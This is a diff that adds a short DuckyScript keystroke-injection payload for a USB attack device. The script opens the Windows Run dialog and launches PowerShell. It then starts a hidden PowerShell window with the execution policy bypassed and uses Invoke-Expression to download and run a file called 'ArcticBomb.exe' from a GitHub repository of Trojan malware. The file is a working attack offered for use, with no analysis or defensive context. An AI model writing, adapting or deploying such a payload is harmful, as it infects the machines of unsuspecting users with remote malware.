@@ -1,0 +1,13 @@
+DELAY 1000
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Open PowerShell
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Bypass the execution policy and hide the PowerShell window
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList {'-NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''https://github.com/Da2dalus/The-MALWARE-Repo/raw/master/Trojan/ArcticBomb.exe'');"'}
+ENTER
